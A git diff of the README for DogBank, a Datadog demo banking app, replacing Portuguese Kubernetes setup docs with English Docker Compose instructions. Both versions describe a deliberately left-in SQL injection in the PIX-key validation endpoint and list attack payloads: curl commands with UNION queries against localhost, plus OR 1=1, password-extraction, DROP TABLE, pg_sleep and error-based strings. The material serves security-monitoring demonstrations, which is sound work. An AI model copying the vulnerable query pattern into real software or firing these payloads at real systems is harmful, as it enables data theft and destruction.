@@ -1,812 +1,409 @@
-# 🐕 DogBank - Sistema Bancário Digital com Observabilidade Completa
+# 🐕 DogBank - Demo Banking Application
 
-[![CI/CD](https://github.com/schawirin/Dogbank/actions/workflows/build-and-push.yml/badge.svg)](https://github.com/schawirin/Dogbank/actions)
-[![Datadog Monitoring](https://img.shields.io/badge/Datadog-Monitored-632CA6?logo=datadog)](https://www.datadoghq.com/)
-[![Kubernetes](https://img.shields.io/badge/Kubernetes-Ready-326CE5?logo=kubernetes)](https://kubernetes.io/)
+<p align="center">
+  <img src="https://img.shields.io/badge/Java-21-orange?style=for-the-badge&logo=openjdk" alt="Java 21">
+  <img src="https://img.shields.io/badge/Spring_Boot-3.2-green?style=for-the-badge&logo=spring" alt="Spring Boot">
+  <img src="https://img.shields.io/badge/React-18-blue?style=for-the-badge&logo=react" alt="React">
+  <img src="https://img.shields.io/badge/PostgreSQL-15-blue?style=for-the-badge&logo=postgresql" alt="PostgreSQL">
+  <img src="https://img.shields.io/badge/Docker-Compose-blue?style=for-the-badge&logo=docker" alt="Docker">
+  <img src="https://img.shields.io/badge/Datadog-APM-purple?style=for-the-badge&logo=datadog" alt="Datadog">
+</p>
 
-Sistema bancário digital moderno com foco em **observabilidade**, **monitoramento distribuído** e **segurança**. Implementa transações PIX com validação em tempo real pelo Banco Central simulado, totalmente instrumentado com Datadog APM, RUM, Logs e Security.
-
----
-
-## 📋 Índice
-
-- [Visão Geral](#-visão-geral)
-- [Arquitetura](#-arquitetura)
-- [Módulos da Aplicação](#-módulos-da-aplicação)
-- [Stack Tecnológico](#-stack-tecnológico)
-- [Pré-requisitos](#-pré-requisitos)
-- [Configuração do Ambiente](#-configuração-do-ambiente)
-- [Como Executar](#-como-executar)
-- [CI/CD Pipeline](#-cicd-pipeline)
-- [Observabilidade com Datadog](#-observabilidade-com-datadog)
-- [Acesso à Aplicação](#-acesso-à-aplicação)
-- [Estrutura do Projeto](#-estrutura-do-projeto)
-- [Features Implementadas](#-features-implementadas)
-- [Troubleshooting](#-troubleshooting)
+DogBank is a **demo banking application** designed for demonstrating observability, security testing, and microservices architecture. It includes intentional vulnerabilities for security demonstrations and is fully instrumented with Datadog APM.
 
 ---
 
-## 🎯 Visão Geral
-
-O **DogBank** é uma aplicação de demonstração de um sistema bancário digital construído com arquitetura de microserviços, focado em:
-
-- ✅ **Observabilidade completa** com Datadog (APM, RUM, Logs, Security)
-- ✅ **Distributed Tracing** end-to-end
-- ✅ **Correlação automática** entre logs, traces e métricas
-- ✅ **Segurança integrada** com ASM (Application Security Monitoring)
-- ✅ **CI/CD automatizado** com GitHub Actions
-- ✅ **Deployment em Kubernetes** com EKS
-
-### 🚀 Principais Funcionalidades
-
-- **Autenticação e Autorização** (JWT)
-- **Gestão de Contas Bancárias**
-- **Transferências via PIX** com validação no Banco Central
-- **Simulação de erros** (timeout, saldo insuficiente, limite excedido)
-- **Dashboard em tempo real** (React)
-
----
-
-## 🏗️ Arquitetura
+## 📁 Repository Structure
 
 ```
-┌──────────────────────────────────────────────────────────────┐
-│                     Traefik Ingress                          │
-│              (a3e5f8c-production-default.us-east-1.elb...)   │
-└─────────────────────┬────────────────────────────────────────┘
-                      │
-          ┌───────────┴──────────┬─────────────────┐
-          │                      │                 │
-    ┌─────▼─────┐         ┌─────▼─────┐    ┌─────▼─────┐
-    │  Frontend │         │   Auth    │    │  Accounts │
-    │  (React)  │         │   :8088   │    │   :8089   │
-    └───────────┘         └───────────┘    └───────────┘
-          │                      │                 │
-          └──────────┬───────────┴─────────────────┘
-                     │
-          ┌──────────┴────────────┬────────────────┐
-          │                       │                │
-    ┌─────▼─────┐          ┌─────▼─────┐   ┌─────▼─────┐
-    │Transaction│          │Integration│   │   Banco   │
-    │   :8084   │          │   :8082   │   │  Central  │
-    └─────┬─────┘          └───────────┘   │   :8085   │
-          │                                 └───────────┘
-    ┌─────▼─────┐
-    │PostgreSQL │
-    │   :5432   │
-    └───────────┘
+.
+├── instrumented/docker/          # 🔍 Version WITH Datadog APM instrumentation
+│   ├── dogbank/                  # Backend microservices (Java/Spring Boot)
+│   └── dogbank-frontend/         # Frontend (React)
+│
+├── non-instrumented/docker/      # 🚫 Version WITHOUT Datadog (for local dev)
+│   ├── dogbank/                  # Backend microservices (Java/Spring Boot)
+│   └── dogbank-frontend/         # Frontend (React)
+│
+└── README.md                     # This file
 ```
 
-**Todos os serviços são instrumentados com Datadog Agent via Admission Controller.**
+---
+
+## 🚀 Quick Start
+
+### Prerequisites
+
+- Docker & Docker Compose
+- Git
+- (For instrumented version) Datadog API Key
+
+### Option 1: Non-Instrumented Version (No Datadog)
+
+```bash
+# Clone the repository
+git clone https://github.com/schawirin/Dogbank.git
+cd Dogbank/non-instrumented/docker/dogbank
+
+# Start all services
+docker-compose up -d --build
+
+# Wait for services to be healthy (about 2-3 minutes)
+docker-compose ps
+
+# Access the application
+open http://localhost
+```
+
+### Option 2: Instrumented Version (With Datadog APM)
+
+```bash
+# Clone the repository
+git clone https://github.com/schawirin/Dogbank.git
+cd Dogbank/instrumented/docker/dogbank
+
+# Set your Datadog API Key
+export DD_API_KEY="your-datadog-api-key-here"
+
+# Start all services
+docker-compose -f docker-compose.full.yml up -d --build
+
+# Wait for services to be healthy (about 2-3 minutes)
+docker-compose -f docker-compose.full.yml ps
+
+# Access the application
+open http://localhost
+```
 
 ---
 
-## 📦 Módulos da Aplicação
+## 🔐 Test Credentials
 
-### 1. **auth-module** (porta 8088)
-- **Responsabilidade**: Autenticação e autorização de usuários
-- **Tecnologia**: Spring Boot 2.7.0, Spring Security, JWT
-- **Funcionalidades**:
-  - Login/logout
-  - Geração e validação de tokens JWT
-  - Gestão de usuários
-
-### 2. **account-module** (porta 8089)
-- **Responsabilidade**: Gestão de contas bancárias
-- **Tecnologia**: Spring Boot 2.7.0, Spring Data JPA
-- **Funcionalidades**:
-  - Criação de contas
-  - Consulta de saldo
-  - Histórico de transações
-
-### 3. **transaction-module** (porta 8084)
-- **Responsabilidade**: Processamento de transações PIX
-- **Tecnologia**: Spring Boot 2.7.0, RestTemplate
-- **Funcionalidades**:
-  - Transferências via PIX
-  - Validação com Banco Central
-  - Logs estruturados com MDC (trace correlation)
-  - Tratamento de erros (timeout, saldo insuficiente)
-
-### 4. **bancocentral-module** (porta 8085)
-- **Responsabilidade**: Simulador do Banco Central do Brasil
-- **Tecnologia**: Spring Boot 2.7.0
-- **Funcionalidades**:
-  - Validação de chaves PIX
-  - Simulação de cenários de erro:
-    - `R$ 100,00` → Timeout (5 segundos)
-    - `R$ 1.000,00` → Limite excedido
-    - `R$ 5.000,00` → Saldo insuficiente
-    - `R$ 666,66` → Erro interno
-    - Chave sem `@` → Chave inválida
-
-### 5. **integration-module** (porta 8082)
-- **Responsabilidade**: Integrações externas e cache
-- **Tecnologia**: Spring Boot 2.7.0, Spring Data JPA
-
-### 6. **notification-module** (porta 8083)
-- **Responsabilidade**: Notificações de transações
-- **Tecnologia**: Spring Boot 2.7.0
-
-### 7. **dogbank-frontend** (React)
-- **Responsabilidade**: Interface do usuário
-- **Tecnologia**: React 18, Vite, TailwindCSS
-- **Features**:
-  - Dashboard de contas
-  - Interface de transferência PIX
-  - Datadog RUM integrado
+| User | CPF | Password | Balance | PIX Key |
+|------|-----|----------|---------|---------|
+| Julia Medina | 12345678901 | 123456 | R$ 10,000.00 | julia.medina@dogbank.com |
+| Pedro Silva | 98765432101 | 123456 | R$ 15,000.00 | pedro.silva@dogbank.com |
+| Usuário Teste | 66666666666 | 123456 | R$ 50,000.00 | teste@dogbank.com |
+| João Santos | 11122233344 | 123456 | R$ 8,500.00 | joao.santos@dogbank.com |
 
 ---
 
-## 🛠️ Stack Tecnológico
+## 🧪 Demo Scenarios
 
-### Backend
-| Tecnologia | Versão |
-|------------|--------|
-| Java | 17 (Eclipse Temurin) |
-| Spring Boot | 2.7.0 |
-| Maven | 3.9.7 |
-| PostgreSQL | 15 |
-| Log4j2 | 2.17.1 |
-| ECS Layout | 1.5.0 |
+### 1. ✅ Successful PIX Transfer
+
+1. Login with CPF `66666666666` and password `123456`
+2. Click on "PIX" in the sidebar
+3. Enter PIX key: `pedro.silva@dogbank.com`
+4. Enter amount: `100`
+5. Confirm with password `123456`
+6. ✅ Transaction should complete successfully
+
+### 2. ❌ Expected Error: Invalid PIX Key
+
+1. Login with any user
+2. Go to PIX transfer
+3. Enter an invalid PIX key: `invalid@email.com`
+4. ❌ **Error**: "Chave PIX não encontrada no sistema"
+
+### 3. ❌ Expected Error: Insufficient Balance
+
+1. Login with CPF `11122233344` (João Santos - R$ 8,500)
+2. Try to transfer R$ 10,000 to any valid PIX key
+3. ❌ **Error**: "Saldo insuficiente"
+
+### 4. ❌ Expected Error: Transfer to Self
+
+1. Login with CPF `66666666666`
+2. Try to transfer to `teste@dogbank.com` (same user)
+3. ❌ **Error**: "Não é possível transferir para si mesmo"
+
+### 5. ⏱️ Expected Error: Timeout (Banco Central)
+
+1. Login with any user
+2. Transfer exactly R$ 100.00 to any valid PIX key
+3. ⏱️ **Error**: Timeout from Banco Central (simulated delay)
+
+### 6. 🚫 Expected Error: Limit Exceeded
+
+1. Login with any user
+2. Transfer exactly R$ 1,000.00 to any valid PIX key
+3. 🚫 **Error**: "Limite de transação excedido"
+
+---
+
+## 🔓 Security Vulnerabilities (For Demo)
+
+> ⚠️ **WARNING**: These vulnerabilities are intentional for security demonstrations. Never use this code in production!
+
+### SQL Injection Vulnerability
+
+**Endpoint**: `GET /api/transactions/validate-pix-key?pixKey=...`
+
+**Vulnerable Code** (TransactionService.java line 259-262):
+```java
+String sql = "SELECT u.nome, u.email, u.cpf, c.saldo, c.banco, u.chave_pix " +
+             "FROM usuarios u " +
+             "JOIN contas c ON u.id = c.usuario_id " +
+             "WHERE u.chave_pix = '" + pixKey + "'";  // ⚠️ VULNERABLE!
+```
+
+**Attack Examples**:
+
+```bash
+# 1. Basic SQL Injection - Always True (returns first user)
+curl "http://localhost/api/transactions/validate-pix-key?pixKey=' OR '1'='1"
+
+# 2. UNION-based Injection - Extract all users
+curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT nome, email, cpf, saldo::text, 'DogBank', chave_pix FROM usuarios u JOIN contas c ON u.id = c.usuario_id--"
+
+# 3. Extract table names from database
+curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT table_name, null, null, null, null, null FROM information_schema.tables WHERE table_schema='public'--"
+
+# 4. Extract column names from usuarios table
+curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT column_name, null, null, null, null, null FROM information_schema.columns WHERE table_name='usuarios'--"
+```
+
+**What to observe in Datadog**:
+- APM traces showing the raw SQL query with injected payload
+- Security signals detecting SQL injection patterns
+- Error logs with SQL syntax errors from malformed injections
+- ASM (Application Security Monitoring) alerts
+
+---
+
+## 🏗️ Tech Stack
+
+### Backend (Microservices)
+
+| Service | Technology | Port | Description |
+|---------|------------|------|-------------|
+| auth-service | Java 21 + Spring Boot 3.2 | 8086 | User authentication & management |
+| account-service | Java 21 + Spring Boot 3.2 | 8089 | Account management |
+| transaction-service | Java 21 + Spring Boot 3.2 | 8087 | PIX transactions |
+| bancocentral-service | Java 21 + Spring Boot 3.2 | 8085 | PIX validation (mock Banco Central) |
 
 ### Frontend
-| Tecnologia | Versão |
-|------------|--------|
-| React | 18.x |
-| Vite | 4.x |
-| TailwindCSS | 3.x |
-| Datadog Browser SDK | 5.x |
 
-### Infraestrutura
-| Tecnologia | Versão |
-|------------|--------|
-| Kubernetes | 1.27+ |
-| Traefik | 2.x |
-| Docker | 24.x |
-| GitHub Actions | - |
+| Technology | Version | Description |
+|------------|---------|-------------|
+| React | 18.x | UI Framework |
+| Vite | 5.x | Build tool |
+| TailwindCSS | 3.x | Styling |
+| Axios | 1.x | HTTP client |
+| React Router | 6.x | Routing |
 
-### Observabilidade
-| Ferramenta | Uso |
-|------------|-----|
-| Datadog Agent | 7.x |
-| Datadog APM | Distributed Tracing |
-| Datadog Logs | Correlação de logs |
-| Datadog RUM | Real User Monitoring |
-| Datadog ASM | Application Security |
+### Infrastructure
 
----
+| Technology | Version | Description |
+|------------|---------|-------------|
+| PostgreSQL | 15 | Primary database |
+| Redis | 7 | Cache layer |
+| Nginx | Alpine | Reverse proxy & API gateway |
+| Docker Compose | 3.8 | Container orchestration |
 
-## ✅ Pré-requisitos
+### Observability (Instrumented Version Only)
 
-Antes de começar, certifique-se de ter:
-
-- ✅ **Kubernetes Cluster** (EKS, GKE, AKS ou local com Minikube)
-- ✅ **kubectl** instalado e configurado
-- ✅ **Docker** (para build local)
-- ✅ **Conta Datadog** com API Key
-- ✅ **Datadog Operator** instalado no cluster
-- ✅ **GitHub Account** (para CI/CD)
-- ✅ **Docker Hub Account** (ou outro registry)
+| Technology | Description |
+|------------|-------------|
+| Datadog Agent | Metrics, logs, and APM collection |
+| Datadog APM | Distributed tracing |
+| Datadog RUM | Real User Monitoring (frontend) |
+| Datadog ASM | Application Security Monitoring |
+| dd-trace-java | Java APM instrumentation |
 
 ---
 
-## ⚙️ Configuração do Ambiente
+## 🔄 Git Flow
 
-### 1. **Criar Secret do PostgreSQL**
+We follow a simplified Git Flow workflow:
 
-⚠️ **IMPORTANTE**: Antes de fazer o deploy, crie o secret do banco de dados:
-
-```bash
-# Encode as credenciais em base64
-echo -n "dogbank" | base64    # Usuário
-echo -n "dog1234" | base64    # Senha
-echo -n "dogbank" | base64    # Database
-
-# O dogbank-complete.yaml já contém o secret, mas você pode customizar:
-# POSTGRES_USER: ZG9nYmFuaw==      (dogbank)
-# POSTGRES_PASSWORD: ZG9nMTIzNA==  (dog1234)
-# POSTGRES_DB: ZG9nYmFuaw==        (dogbank)
+```
+main (production)
+  │
+  ├── develop (integration)
+  │     │
+  │     ├── feature/xxx (new features)
+  │     ├── bugfix/xxx (bug fixes)
+  │     └── hotfix/xxx (urgent fixes)
+  │
+  └── release/x.x.x (release candidates)
 ```
 
-### 2. **Configurar Datadog RUM no Frontend**
+### Branch Naming Convention
 
-📝 **Edite o arquivo**: `dogbank-frontend/src/main.jsx`
+| Type | Pattern | Example |
+|------|---------|---------|
+| Feature | `feature/description` | `feature/add-pix-qrcode` |
+| Bug Fix | `bugfix/description` | `bugfix/fix-balance-calculation` |
+| Hot Fix | `hotfix/description` | `hotfix/security-patch` |
+| Release | `release/version` | `release/1.2.0` |
 
-```javascript
-datadogRum.init({
-  applicationId: 'SEU_APPLICATION_ID',  // ⚠️ ALTERE AQUI
-  clientToken: 'SEU_CLIENT_TOKEN',       // ⚠️ ALTERE AQUI
-  site: 'datadoghq.com',
-  service: 'dogbank-frontend',
-  env: 'production',
-  version: '1.0.0',
-  sessionSampleRate: 100,
-  sessionReplaySampleRate: 100,
-  trackUserInteractions: true,
-  trackResources: true,
-  trackLongTasks: true,
-  defaultPrivacyLevel: 'mask-user-input',
-});
+### Commit Message Convention
+
+```
+type(scope): description
+
+[optional body]
+
+[optional footer]
 ```
 
-**Como obter as credenciais**:
-1. Acesse: https://app.datadoghq.com/rum/application/create
-2. Crie uma nova aplicação RUM
-3. Copie o `Application ID` e `Client Token`
+**Types**: `feat`, `fix`, `docs`, `style`, `refactor`, `test`, `chore`
 
-### 3. **Configurar Secrets do GitHub (para CI/CD)**
-
-No seu repositório GitHub, vá em **Settings → Secrets and variables → Actions** e adicione:
-
-| Secret Name | Descrição | Exemplo |
-|-------------|-----------|---------|
-| `DOCKERHUB_USERNAME` | Usuário do Docker Hub | `schawirin` |
-| `DOCKERHUB_TOKEN` | Token de acesso do Docker Hub | `dckr_pat_...` |
-
-### 4. **Configurar Datadog Operator no Cluster**
-
-```bash
-# Instalar o Datadog Operator
-helm repo add datadog https://helm.datadoghq.com
-helm repo update
-
-kubectl create namespace datadog
-
-helm install datadog-operator datadog/datadog-operator \
-  --namespace datadog
-
-# Criar DatadogAgent com auto-instrumentation
-cat <<EOF | kubectl apply -f -
-apiVersion: datadoghq.com/v2alpha1
-kind: DatadogAgent
-metadata:
-  name: datadog
-  namespace: datadog
-spec:
-  global:
-    site: datadoghq.com
-    credentials:
-      apiKey: <SUA_API_KEY>
-      appKey: <SUA_APP_KEY>
-  features:
-    apm:
-      enabled: true
-      unixDomainSocketConfig:
-        enabled: true
-    logCollection:
-      enabled: true
-      containerCollectAll: true
-    admissionController:
-      enabled: true
-      mutateUnlabelled: false
-EOF
+**Examples**:
+```
+feat(pix): add QR code generation for PIX transfers
+fix(auth): resolve session timeout issue
+docs(readme): update installation instructions
 ```
 
 ---
 
-## 🚀 Como Executar
+## 📊 API Endpoints
 
-### Opção 1: Deploy Completo no Kubernetes
+### Authentication (`/api/auth`)
 
-```bash
-# 1. Clone o repositório
-git clone https://github.com/schawirin/Dogbank.git
-cd Dogbank
+| Method | Endpoint | Description |
+|--------|----------|-------------|
+| POST | `/api/auth/login` | User login |
+| POST | `/api/auth/validate-password` | Validate transaction password |
+| GET | `/api/auth/pix-key/{pixKey}` | Get user by PIX key |
 
-# 2. Deploy completo (namespace, secrets, deployments, services)
-kubectl apply -f dogbank-complete.yaml
+### Accounts (`/api/accounts`)
 
-# 3. Aguarde os pods ficarem prontos
-kubectl get pods -n production -w
+| Method | Endpoint | Description |
+|--------|----------|-------------|
+| GET | `/api/accounts/cpf/{cpf}` | Get account by CPF |
+| GET | `/api/accounts/{id}` | Get account by ID |
+| GET | `/api/accounts/{id}/balance` | Get account balance |
 
-# 4. Verifique os services
-kubectl get svc -n production
-```
+### Transactions (`/api/transactions`)
 
-### Opção 2: Build e Deploy Local
+| Method | Endpoint | Description |
+|--------|----------|-------------|
+| POST | `/api/transactions/pix` | Execute PIX transfer |
+| GET | `/api/transactions/account/{accountId}` | Get transaction history |
+| GET | `/api/transactions/validate-pix-key` | Validate PIX key (⚠️ **Vulnerable to SQL Injection**) |
 
-```bash
-# Build de todos os módulos
-cd dogbank
+### Banco Central (`/api/bancocentral`)
 
-# Transaction
-docker buildx build --platform linux/amd64 \
-  -f transaction-module/Dockerfile \
-  -t seu-usuario/dogbank-transaction-service:latest \
-  --push .
+| Method | Endpoint | Description |
+|--------|----------|-------------|
+| POST | `/api/bancocentral/pix/validate` | Validate PIX transaction |
 
-# Auth
-docker buildx build --platform linux/amd64 \
-  -f auth-module/Dockerfile \
-  -t seu-usuario/dogbank-auth-service:latest \
-  --push .
+---
 
-# Repita para todos os módulos...
+## 🛠️ Development
 
-# Deploy
-kubectl apply -f dogbank-complete.yaml
-```
-
-### Opção 3: Desenvolvimento Local
+### Running Locally (Without Docker)
 
 ```bash
-# Backend (cada módulo)
-cd dogbank/transaction-module
-mvn spring-boot:run
+# Backend (each service)
+cd instrumented/docker/dogbank/auth-module
+./mvnw spring-boot:run
 
 # Frontend
-cd dogbank-frontend
+cd instrumented/docker/dogbank-frontend
 npm install
 npm run dev
 ```
 
----
-
-## 🔄 CI/CD Pipeline
-
-O projeto utiliza **GitHub Actions** para CI/CD automatizado:
-
-### Workflow: `build-and-push.yml`
-
-**Triggers**:
-- ✅ Push na branch `main`
-- ✅ Pull Requests
-
-**Jobs**:
-1. **Build & Push** de cada módulo (auth, account, transaction, etc.)
-2. **Build Docker images** multi-architecture (linux/amd64)
-3. **Push para Docker Hub** automaticamente
-
-### Integração com Datadog CI Visibility
-
-📊 **Recomendação**: Integre o GitHub Actions com Datadog CI Visibility:
-
-```yaml
-# Adicione ao seu workflow (.github/workflows/build-and-push.yml)
-- name: Datadog CI Test Visibility
-  env:
-    DD_ENV: ci
-    DD_SERVICE: dogbank
-    DATADOG_API_KEY: ${{ secrets.DATADOG_API_KEY }}
-  run: |
-    # Seus comandos de build/test
-```
-
-**Como configurar**:
-1. Acesse: https://app.datadoghq.com/ci/setup
-2. Selecione "GitHub Actions"
-3. Siga as instruções para adicionar o `DD_API_KEY`
-
----
-
-## 📊 Observabilidade com Datadog
-
-### APM (Application Performance Monitoring)
-
-✅ **Configurado automaticamente** via Datadog Admission Controller
-
-**Features ativas**:
-- Distributed Tracing end-to-end
-- Profiling contínuo
-- Service Map automático
-- Error Tracking
-
-**Acessar**: https://app.datadoghq.com/apm/services
-
-### Logs
-
-✅ **Formato**: JSON (ECS Layout)  
-✅ **Correlação**: Automática com `dd.trace_id` e `dd.span_id`
-
-**Campos customizados no TransactionService**:
-- `chave_pix`
-- `valor`
-- `status_transacao`
-- `remetente_nome`
-- `remetente_banco`
-- `destinatario_nome`
-- `destinatario_banco`
-- `transaction_id`
-- `duracao_ms`
-
-**Acessar**: https://app.datadoghq.com/logs
-
-### RUM (Real User Monitoring)
-
-✅ **Frontend**: React com Datadog Browser SDK  
-✅ **Features**:
-- Session Replay
-- User interactions tracking
-- Resource tracking
-- Error tracking
-
-**Acessar**: https://app.datadoghq.com/rum
-
-### Security (ASM)
-
-✅ **Application Security Monitoring** ativo em todos os serviços  
-✅ **Features**:
-- Detecção de ataques (SQL Injection, XSS, etc.)
-- IAST (Interactive Application Security Testing)
-- SCA (Software Composition Analysis)
-
-**Acessar**: https://app.datadoghq.com/security/appsec
-
----
-
-## 🌐 Acesso à Aplicação
-
-### Via Traefik Ingress
-
-Por padrão, a aplicação é exposta via **Traefik LoadBalancer**:
+### Building Docker Images
 
 ```bash
-# Obter o DNS do LoadBalancer
-kubectl get svc -n production traefik
+# Build all services
+cd instrumented/docker/dogbank
+docker-compose -f docker-compose.full.yml build
 
-# Exemplo de saída:
-# NAME      TYPE           EXTERNAL-IP
-# traefik   LoadBalancer   a3e5f8c-production-default.us-east-1.elb.amazonaws.com
+# Build specific service
+docker-compose -f docker-compose.full.yml build auth-service
 ```
 
-**Acessar o frontend**:
-```
-http://<EXTERNAL-IP>
-```
-
-**Acessar os serviços**:
-- Auth: `http://<EXTERNAL-IP>/auth`
-- Accounts: `http://<EXTERNAL-IP>/accounts`
-- Transactions: `http://<EXTERNAL-IP>/transactions`
-
-### 🚀 Publicar com Domínio Próprio (Recomendado)
-
-#### Opção 1: AWS Route53
+### Viewing Logs
 
 ```bash
-# 1. Criar Hosted Zone no Route53
-aws route53 create-hosted-zone --name dogbank.io
+# All services
+docker-compose -f docker-compose.full.yml logs -f
 
-# 2. Criar registro A apontando para o LoadBalancer
-aws route53 change-resource-record-sets \
-  --hosted-zone-id Z123456789 \
-  --change-batch '{
-    "Changes": [{
-      "Action": "CREATE",
-      "ResourceRecordSet": {
-        "Name": "dogbank.io",
-        "Type": "A",
-        "AliasTarget": {
-          "HostedZoneId": "Z35SXDOTRQ7X7K",
-          "DNSName": "a3e5f8c-production-default.us-east-1.elb.amazonaws.com",
-          "EvaluateTargetHealth": false
-        }
-      }
-    }]
-  }'
+# Specific service
+docker-compose -f docker-compose.full.yml logs -f transaction-service
 
-# 3. Atualizar Traefik IngressRoute
-kubectl apply -f - <<EOF
-apiVersion: traefik.containo.us/v1alpha1
-kind: IngressRoute
-metadata:
-  name: dogbank-frontend
-  namespace: production
-spec:
-  entryPoints:
-    - websecure
-  routes:
-    - match: Host(\`dogbank.io\`)
-      kind: Rule
-      services:
-        - name: dogbank-frontend
-          port: 80
-  tls:
-    certResolver: letsencrypt
-EOF
+# Filter for errors
+docker-compose -f docker-compose.full.yml logs transaction-service 2>&1 | grep -E "ERROR|Exception"
 ```
 
-#### Opção 2: Cloudflare
+### Database Access
 
 ```bash
-# 1. Adicionar domínio no Cloudflare
-# 2. Criar registro CNAME
-# Nome: @
-# Conteúdo: <EXTERNAL-IP-DO-TRAEFIK>
-# Proxy: Ativado (nuvem laranja)
+# Connect to PostgreSQL
+docker exec -it dogbank-postgres psql -U dogbank -d dogbank
 
-# 3. Configurar SSL/TLS: Full (strict)
-```
+# View users
+SELECT * FROM usuarios;
 
-#### Opção 3: GCP Cloud DNS
+# View accounts
+SELECT * FROM contas;
 
-```bash
-# Criar zona DNS
-gcloud dns managed-zones create dogbank-zone \
-  --dns-name="dogbank.io." \
-  --description="DogBank DNS Zone"
+# View transactions
+SELECT * FROM transacoes;
 
-# Adicionar registro A
-gcloud dns record-sets transaction start --zone=dogbank-zone
-gcloud dns record-sets transaction add <EXTERNAL-IP> \
-  --name="dogbank.io." --ttl=300 --type=A --zone=dogbank-zone
-gcloud dns record-sets transaction execute --zone=dogbank-zone
+# View PIX keys
+SELECT id, nome, cpf, chave_pix FROM usuarios;
 ```
 
 ---
 
-## 📂 Estrutura do Projeto
+## 📱 Application Pages
 
-```
-Dogbank/
-├── .github/
-│   └── workflows/
-│       └── build-and-push.yml          # CI/CD pipeline
-├── dogbank/
-│   ├── pom.xml                         # Parent POM
-│   ├── auth-module/
-│   │   ├── src/
-│   │   ├── Dockerfile
-│   │   └── pom.xml
-│   ├── account-module/
-│   │   ├── src/
-│   │   ├── Dockerfile
-│   │   └── pom.xml
-│   ├── transaction-module/
-│   │   ├── src/
-│   │   ├── Dockerfile
-│   │   └── pom.xml
-│   ├── bancocentral-module/
-│   │   ├── src/
-│   │   ├── Dockerfile
-│   │   └── pom.xml
-│   ├── integration-module/
-│   │   ├── src/
-│   │   ├── Dockerfile
-│   │   └── pom.xml
-│   └── notification-module/
-│       ├── src/
-│       ├── Dockerfile
-│       └── pom.xml
-├── dogbank-frontend/
-│   ├── src/
-│   │   ├── main.jsx                   # Datadog RUM config
-│   │   └── ...
-│   ├── Dockerfile
-│   └── package.json
-├── dogbank-complete.yaml              # Kubernetes manifests
-└── README.md
-```
+| Page | URL | Description |
+|------|-----|-------------|
+| Landing | `/` | Welcome page |
+| Login | `/login` | User authentication |
+| Dashboard | `/dashboard` | Main dashboard with balance and quick actions |
+| PIX Transfer | `/dashboard/pix` | Start a new PIX transfer |
+| PIX Confirm | `/dashboard/pix/confirm` | Confirm PIX transfer details |
+| PIX Receipt | `/dashboard/pix/receipt` | Transaction receipt |
+| Statement | `/dashboard/extrato` | Transaction history |
+| Cards | `/dashboard/cartoes` | Credit card management |
+| Profile | `/dashboard/perfil` | User profile with credit score |
 
 ---
 
-## ✨ Features Implementadas
-
-### Backend
-- ✅ Arquitetura de microserviços
-- ✅ Autenticação JWT
-- ✅ Validação de transações PIX
-- ✅ Simulação de cenários de erro
-- ✅ Logs estruturados em JSON (ECS)
-- ✅ Correlação automática de traces e logs
-- ✅ Health checks (Spring Actuator)
-- ✅ Security (Spring Security)
-
-### Frontend
-- ✅ Dashboard responsivo
-- ✅ Interface de transferência PIX
-- ✅ Datadog RUM integrado
-- ✅ Session Replay
-- ✅ Error tracking
-
-### DevOps
-- ✅ CI/CD automatizado (GitHub Actions)
-- ✅ Multi-stage Docker builds
-- ✅ Kubernetes manifests
-- ✅ Secrets management
-- ✅ Resource limits e requests
-- ✅ Liveness e Readiness probes
-- ✅ Rolling updates
-
-### Observabilidade
-- ✅ APM end-to-end
-- ✅ Distributed Tracing
-- ✅ Log correlation
-- ✅ RUM (Real User Monitoring)
-- ✅ Profiling
-- ✅ Security Monitoring (ASM)
-- ✅ CI Visibility (recomendado)
-
----
-
-## 🐛 Troubleshooting
-
-### Pods não iniciam
+## 🧹 Cleanup
 
 ```bash
-# Ver logs do pod
-kubectl logs -n production <pod-name>
+# Stop all services
+docker-compose -f docker-compose.full.yml down
 
-# Descrever o pod
-kubectl describe pod -n production <pod-name>
+# Stop and remove volumes (delete all data)
+docker-compose -f docker-compose.full.yml down -v
 
-# Verificar events
-kubectl get events -n production --sort-by='.lastTimestamp'
+# Remove all DogBank images
+docker images | grep dogbank | awk '{print $3}' | xargs docker rmi -f
+
+# Clean up everything
+docker system prune -af
 ```
-
-### Health checks falhando
-
-```bash
-# Testar endpoint manualmente
-kubectl port-forward -n production svc/accounts-service 8089:8089
-curl http://localhost:8089/actuator/health
-```
-
-### Logs não aparecem no Datadog
-
-```bash
-# Verificar se o Datadog Agent está rodando
-kubectl get pods -n datadog
-
-# Verificar logs do Agent
-kubectl logs -n datadog <datadog-agent-pod>
-
-# Verificar se os pods têm as labels corretas
-kubectl get pods -n production --show-labels
-```
-
-### Traces não correlacionam com logs
-
-```bash
-# Verificar se DD_LOGS_INJECTION está setado
-kubectl get deployment -n production transactions -o yaml | grep DD_LOGS_INJECTION
-
-# Verificar formato dos logs (deve ser JSON)
-kubectl logs -n production <pod-name> | head -1 | jq .
-
-
-
-
-```
-
-EXTRA !! Testar ataque de sql Injection !!
-
-
-Como funciona o ataque:
-1. Query SQL Normal:
-sqlSELECT u.nome, u.email, u.cpf, c.saldo, c.banco, u.chave_pix 
-FROM usuarios u 
-JOIN contas c ON u.id = c.usuario_id 
-WHERE u.chave_pix = 'yuki.pix@email.com'
-2. Query SQL com Injection:
-sqlSELECT u.nome, u.email, u.cpf, c.saldo, c.banco, u.chave_pix 
-FROM usuarios u 
-JOIN contas c ON u.id = c.usuario_id 
-WHERE u.chave_pix = 'yuki.pix@email.com' OR '1'='1'
-Resultado: Retorna TODOS os usuários porque '1'='1' é sempre verdadeiro!
-🎯 Outros Payloads para testar:
-Payload 1: Bypass simples
-' OR '1'='1
-→ Retorna o primeiro usuário da tabela
-Payload 2: Union-based (extrair dados)
-' UNION SELECT nome, senha, cpf, email, banco, chave_pix FROM usuarios--
-→ Tenta extrair senhas dos usuários
-Payload 3: Comentar resto da query
-test@email.com'--
-→ Ignora o resto da query SQL
-Payload 4: Stacked queries
-'; DROP TABLE transacoes_pix;--
-⚠️ NÃO TESTE ISSO - Vai deletar a tabela!
-Payload 5: Time-based blind
-' OR pg_sleep(5)--
-→ Causa delay de 5 segundos se vulnerável
-Payload 6: Error-based
-' AND 1=CAST((SELECT COUNT(*) FROM usuarios) AS INT)--
-→ Força erro para revelar quantidade de usuários
-🔍 Onde ver o ataque no Datadog:
-1. Logs
-Filtre por:
-@security_event:sql_injection_vulnerable_endpoint
-Você verá:
-json{
